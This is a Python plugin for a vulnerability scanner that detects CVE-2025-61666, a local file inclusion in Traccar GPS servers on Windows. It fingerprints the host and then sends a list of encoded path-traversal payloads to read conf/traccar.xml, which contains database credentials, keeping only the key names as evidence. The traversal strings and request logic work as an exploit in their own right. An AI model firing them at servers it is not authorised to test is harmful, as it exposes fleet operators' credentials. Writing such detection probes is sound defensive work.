"""CVE-2025-61666 — Traccar unauthenticated local file inclusion (Windows).

Traccar is an open-source GPS tracking server widely deployed by logistics
companies and small fleets. Its default install exposes a ``DefaultOverride
Servlet`` that serves static override resources without authentication. On
Windows, a path-normalisation failure in that servlet lets a crafted, encoded
traversal escape the override root and read arbitrary files on disk. The crown
jewel is ``conf/traccar.xml`` — the server's main configuration file — which
routinely contains the database JDBC URL, database credentials, and other server
secrets (``database.user``, ``database.password``, ``web.origin`` …). Affected:
Traccar 6.1 – 6.8.1 on Windows.

This probe is BENIGN and read-only. It performs no exploitation beyond GETs that
*attempt* to read the non-destructive ``conf/traccar.xml`` configuration file — a
file whose mere readability through the override servlet proves the LFI. Nothing
is written and no state changes.

Flow:

    1. GET /api/server               — Traccar's unauthenticated server-info
                                       endpoint (JSON). On unpatched installs this
                                       returns server metadata without a session,
                                       and is the primary fingerprint. The root
                                       page body markers are a secondary check.
    2. GET /conf/traccar.xml         — the LFI target requested *directly*. On a
                                       sane install this is not web-servable
                                       (404/403); that refusal is the control we
                                       compare the traversal against.
    3. GET <override-traversal>      — the same conf/traccar.xml reached through
                                       the DefaultOverrideServlet traversal. A 200
                                       whose body looks like the Traccar config
                                       (``<entry key=...>`` properties XML with
                                       Traccar markers) while the direct path
                                       refused confirms the LFI read.

Severity:
    * HIGH   — Traccar fingerprinted AND the override-servlet traversal returned
               the ``conf/traccar.xml`` config (200 + Traccar properties-XML
               markers) that the direct path refused (404/403). The LFI read is
               confirmed read-only.
    * MEDIUM — the host fingerprints as Traccar but the LFI could not be cleanly
               confirmed on this probe (patched, non-Windows, filtered, or a
               layout change) — a candidate worth a manual check.
    * none   — not Traccar, or the override traversal is correctly rejected and no
               configuration data leaked.

Secret VALUES in the leaked config are never persisted. Evidence records only the
*key names* present in the disclosed XML (e.g. ``database.password``) so a human
can confirm what would have leaked without us storing the secret itself, mirroring
the redaction convention used by the .env and .git plugins.

[Worker decision: plugin filename is cve_2025_61666.py (underscores) because the
runner discovers plugins via importlib and module names cannot contain hyphens.
The canonical CVE id lives in metadata["vuln_id"], matching the existing
cve_2024_23897.py / cve_2025_55752.py / cve_2025_64446.py convention.]
"""

from __future__ import annotations

import re
from typing import Any

import httpx

from miasma.core import Finding, Target

metadata = {
    "vuln_id": "CVE-2025-61666",
    "name": "Traccar unauthenticated local file inclusion (Windows)",
    "description": (
        "Traccar 6.1-6.8.1 on Windows exposes the DefaultOverrideServlet without "
        "authentication; a path-normalisation failure allows an encoded traversal "
        "to escape the override root and read arbitrary files, most notably "
        "conf/traccar.xml, which contains the database JDBC URL and credentials."
    ),
    "confidence": "high",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2025-61666",
    ],
    # Traccar's default web port is 8082; the common reverse-proxy ports follow.
    # port_hint is the canonical field the runner reads to skip irrelevant
    # plugins; default_ports is kept as the in-probe fallback alias.
    "port_hint": [8082, 80, 443],
    "service_hint": ["http", "https"],
    "default_ports": [8082, 80, 443],
}

# Traccar's unauthenticated server-info endpoint (JSON) — the primary fingerprint.
_SERVER_INFO_PATH = "/api/server"

# The LFI target requested directly. On a sane install this is not web-servable;
# that refusal is the control we compare the override-servlet traversal against.
_DIRECT_CONF_PATH = "/conf/traccar.xml"

# Override-servlet traversal shapes that, on a vulnerable Windows Traccar, escape
# the DefaultOverrideServlet's static root and read conf/traccar.xml. We try a
# small ordered set of well-known shapes; all are read-only GETs against the inert
# configuration file. Both backslash (Windows-native) and forward-slash encodings
# are attempted because the normalisation bug is Windows path-separator specific.
_TRAVERSAL_PATHS = (
    "/override/..%2f..%2fconf%2ftraccar.xml",
    "/override/..%5c..%5cconf%5ctraccar.xml",
    "/override/%2e%2e%2f%2e%2e%2fconf%2ftraccar.xml",
    "/override/..%252f..%252fconf%252ftraccar.xml",
    "/web/override/..%2f..%2f..%2fconf%2ftraccar.xml",
)

# Traccar fingerprints. Any one in the server-info JSON, Server header, a known
# cookie, or the root page body marks the host (case-insensitive).
_TRACCAR_MARKERS = ("traccar", "jetty")

# The /api/server endpoint returns a JSON object with these Traccar-specific
# keys. A clean unauthenticated 200 carrying several of them is itself the
# strongest fingerprint even when the literal word "traccar" is absent.
_SERVER_INFO_KEYS = (
    "deviceReadonly",
    "mapUrl",
    "bingKey",
    "poiLayer",
    "registration",
)

# Markers proving the leaked body is the Traccar config (a Java properties XML),
# not a generic error/landing page. The config is a `<properties>` XML whose
# entries are `<entry key="...">value</entry>`.
_CONFIG_MARKERS = ("<entry key=", "<!doctype properties", "<properties")

# Config keys we treat as secret-bearing — their presence escalates context. We
# record the key NAMES only; the secret values are never persisted.
_SECRET_KEY_MARKERS = (
    "password",
    "secret",
    "database.user",
    "database.url",
    "token",
    "key",
)

# Matches the `key="..."` attribute of a Traccar config `<entry>` element.
_ENTRY_KEY_RE = re.compile(r'<entry\s+key="([^"]+)"', re.IGNORECASE)

# TLS ports where we should speak https.
_TLS_PORTS = (443, 8443)

_TIMEOUT = 5.0


def _candidate_ports(target: Target) -> list[int]:
    """Prefer recon-discovered open HTTP-ish ports; else the defaults."""
    open_ports = target.open_ports()
    if open_ports:
        http_like = [
            port
            for port in open_ports
            if "http" in target.service(port).get("name", "").lower()
            or port in metadata["default_ports"]
        ]
        return http_like or open_ports
    return list(metadata["default_ports"])


def _scheme(port: int) -> str:
    return "https" if port in _TLS_PORTS else "http"


def _get(url: str) -> httpx.Response | None:
    """Benign GET; returns None on any transport error.

    TLS verification is disabled and redirects are not followed: the override
    servlet and the static config are served directly, so a redirect (e.g. to a
    login page) means the surface is not unauthenticated and must not flag.
    """
    try:
        return httpx.get(
            url,
            timeout=_TIMEOUT,
            verify=False,
            follow_redirects=False,
        )
    except httpx.HTTPError:
        return None


def _server_header(resp: httpx.Response | None) -> str:
    if resp is None:
        return ""
    return resp.headers.get("server", "")


def _body(resp: httpx.Response | None) -> str:
    if resp is None:
        return ""
    try:
        return resp.text
    except (UnicodeDecodeError, httpx.HTTPError):
        return ""


def _is_traccar(server_info: httpx.Response | None, root: httpx.Response | None) -> bool:
    """True when the responses fingerprint a Traccar server.

    We look across the server-info JSON body, the Server header, the Set-Cookie
    header, and the root page body. A successful unauthenticated /api/server hit
    that returns JSON server metadata is the strongest signal.
    """
    # A clean unauthenticated /api/server JSON carrying several Traccar-specific
    # keys is the strongest signal — the literal word "traccar" need not appear.
    if server_info is not None and server_info.status_code == 200:
        info_body = _body(server_info)
        if sum(1 for key in _SERVER_INFO_KEYS if key in info_body) >= 2:
            return True

    haystack_parts: list[str] = []
    for resp in (server_info, root):
        if resp is None:
            continue
        haystack_parts.append(_server_header(resp))
        haystack_parts.append(resp.headers.get("set-cookie", ""))
        haystack_parts.append(_body(resp))
    haystack = " ".join(haystack_parts).lower()
    return any(marker in haystack for marker in _TRACCAR_MARKERS)


def _looks_like_traccar_config(resp: httpx.Response) -> bool:
    """True when the body looks like the Traccar properties-XML config."""
    body = _body(resp).lower()
    return any(marker in body for marker in _CONFIG_MARKERS)


def _config_key_names(resp: httpx.Response) -> list[str]:
    """Extract the `<entry key="...">` names from the leaked config.

    Only the key NAMES are returned — never the secret values. This lets a human
    confirm what would have leaked (e.g. ``database.password``) without us storing
    the secret itself.
    """
    return _ENTRY_KEY_RE.findall(_body(resp))


def _has_secret_keys(key_names: list[str]) -> bool:
    """True when any disclosed key name looks secret-bearing."""
    lowered = [name.lower() for name in key_names]
    return any(
        marker in name for name in lowered for marker in _SECRET_KEY_MARKERS
    )


def probe(target: Target) -> Finding | None:
    medium_evidence: dict[str, Any] | None = None

    for port in _candidate_ports(target):
        base = f"{_scheme(port)}://{target.host}:{port}"

        # 1. Fingerprint: is this a Traccar host at all? The unauthenticated
        #    server-info endpoint is the primary signal; the root page is backup.
        server_info = _get(f"{base}{_SERVER_INFO_PATH}")
        root = _get(f"{base}/")
        if not _is_traccar(server_info, root):
            # Not a Traccar host — never flag, even on odd responses.
            continue

        server = _server_header(server_info) or _server_header(root)

        # 2. Establish the control: the LFI target requested directly should not
        #    be web-servable (404/403). A direct 200 means the file is exposed by
        #    plain misconfig, not this servlet LFI — we still prefer a confirmed
        #    traversal as the stronger signal, so only a refusing direct path is
        #    treated as a clean control.
        direct = _get(f"{base}{_DIRECT_CONF_PATH}")
        direct_status = direct.status_code if direct is not None else None
        direct_refused = direct_status in (401, 403, 404)

        # 3. Attempt to read conf/traccar.xml through the override-servlet
        #    traversal shapes.
        for path in _TRAVERSAL_PATHS:
            resp = _get(f"{base}{path}")
            if resp is None:
                continue
            status = resp.status_code

            # Correctly rejected — keep trying other shapes / ports.
            if status in (401, 403, 404):
                continue

            if status == 200 and _looks_like_traccar_config(resp) and direct_refused:
                # LFI confirmed: the Traccar config leaked through the traversal
                # while the direct path refused. Record key names only.
                key_names = _config_key_names(resp)
                return Finding(
                    vuln_id=metadata["vuln_id"],
                    host=target.host,
                    confidence="high",
                    evidence={
                        "base_url": base,
                        "traversal_path": path,
                        "traversal_status": status,
                        "direct_path": _DIRECT_CONF_PATH,
                        "direct_status": direct_status,
                        "server_header": server,
                        "leaked_file": "conf/traccar.xml",
                        # Key NAMES only — secret values are never persisted.
                        "config_key_names": key_names,
                        "secret_keys_present": _has_secret_keys(key_names),
                    },
                    description=metadata["description"],
                )

            # Traccar fingerprinted and a traversal path answered with a
            # non-401/403/404 status, but the LFI wasn't cleanly confirmed (no
            # config markers, or the direct path didn't refuse). Remember the
            # first such hit as a MEDIUM candidate; a confirmed HIGH on a later
            # path/port still wins.
            if medium_evidence is None:
                medium_evidence = {
                    "base_url": base,
                    "traversal_path": path,
                    "traversal_status": status,
                    "direct_path": _DIRECT_CONF_PATH,
                    "direct_status": direct_status,
                    "server_header": server,
                    "note": (
                        "Traccar fingerprinted and a traversal path returned a "
                        "non-401/403/404 status, but the conf/traccar.xml read "
                        "was not confirmed (no Traccar config markers, or the "
                        "direct path did not refuse) — manual check recommended."
                    ),
                }

    if medium_evidence is not None:
        return Finding(
            vuln_id=metadata["vuln_id"],
            host=target.host,
            confidence="medium",
            evidence=medium_evidence,
            description=metadata["description"],
        )

    return None
